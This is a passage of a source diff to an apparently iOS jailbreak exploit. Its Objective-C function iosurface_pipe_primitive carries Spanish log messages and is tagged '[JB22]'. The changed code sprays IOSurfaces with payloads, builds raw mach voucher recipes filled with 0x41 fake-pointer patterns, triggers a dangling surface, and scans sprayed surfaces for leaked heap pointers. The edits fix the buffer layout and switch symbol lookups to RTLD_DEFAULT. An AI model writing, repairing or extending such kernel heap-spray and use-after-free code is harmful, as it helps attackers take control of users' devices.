@@ -26824,8 +26824,6 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         ISRSymbols sym;
         int calibShape = -1;
-        int uafTriggered = 0;
-        int sprayHits = 0;
         int replantOK = 0;
         int danglingCreated = 0;
         int sprayHits = 0;
@@ -26940,7 +26938,7 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                         log([NSString stringWithFormat:@"[JB22] Spray: %d/%d surfaces creadas", sprayHits, sprayCount]);
 
                         typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-                        SetValueFn setValue = (SetValueFn)dlsym(sym.surface, "IOSurfaceSetValue");
+                        SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
 
                         if (setValue) {
                             uint8_t payload[256];
@@ -26972,23 +26970,20 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                             vouchers = (mach_voucher_t *)calloc((size_t)vCount, sizeof(mach_voucher_t));
                             if (vouchers) {
                                 for (int i = 0; i < vCount && !isr_stopped(); i++) {
-                                    struct {
-                                        mach_voucher_attr_recipe_data_t recipe;
-                                        uint8_t content[64];
-                                    } buf;
-                                    memset(&buf, 0, sizeof(buf));
-                                    buf.recipe.key = 7;
-                                    buf.recipe.command = 1;
-                                    buf.recipe.previous_voucher = MACH_PORT_NULL;
-                                    buf.recipe.content_size = 64;
-                                    memset(buf.content, 0x42, 64);
+                                    uint8_t buf[16 + 64];
+                                    memset(buf, 0, sizeof(buf));
+                                    uint32_t *hdr = (uint32_t *)buf;
+                                    hdr[0] = 7;
+                                    hdr[1] = 1;
+                                    hdr[2] = 0;
+                                    hdr[3] = 64;
                                     uint64_t fp = 0x4141414141414141ULL;
                                     for (int off = 0; off < 64; off += 8) {
-                                        memcpy(buf.content + off, &fp, 8);
+                                        memcpy(buf + 16 + off, &fp, 8);
                                     }
 
                                     kern_return_t kr = hostCreate(mach_host_self(),
-                                        (mach_voucher_attr_raw_recipe_array_t)&buf,
+                                        (mach_voucher_attr_raw_recipe_array_t)buf,
                                         (mach_msg_type_number_t)sizeof(buf),
                                         &vouchers[i]);
                                     if (kr == KERN_SUCCESS) voucherHits++;
@@ -27015,7 +27010,7 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                                 log([NSString stringWithFormat:@"[JB22] Trigger surface: ID=%u lookup=%s", gid, s2 ? "OK" : "NULL"]);
 
                                 typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
-                                CopyAllFn copyAll = (CopyAllFn)dlsym(sym.surface, "IOSurfaceCopyAllValues");
+                                CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
                                 if (copyAll) {
                                     CFTypeRef vals = copyAll(trigSurf);
                                     if (vals) {
@@ -27041,7 +27036,7 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                         log(@"[JB22] Fase 5: Escaneo de punteros heap en surfaces del spray...");
                         if (!isr_stopped()) {
                             typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
-                            CopyAllFn copyAll = (CopyAllFn)dlsym(sym.surface, "IOSurfaceCopyAllValues");
+                            CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
                             if (copyAll) {
                                 for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
                                     if (!spray[i]) continue;
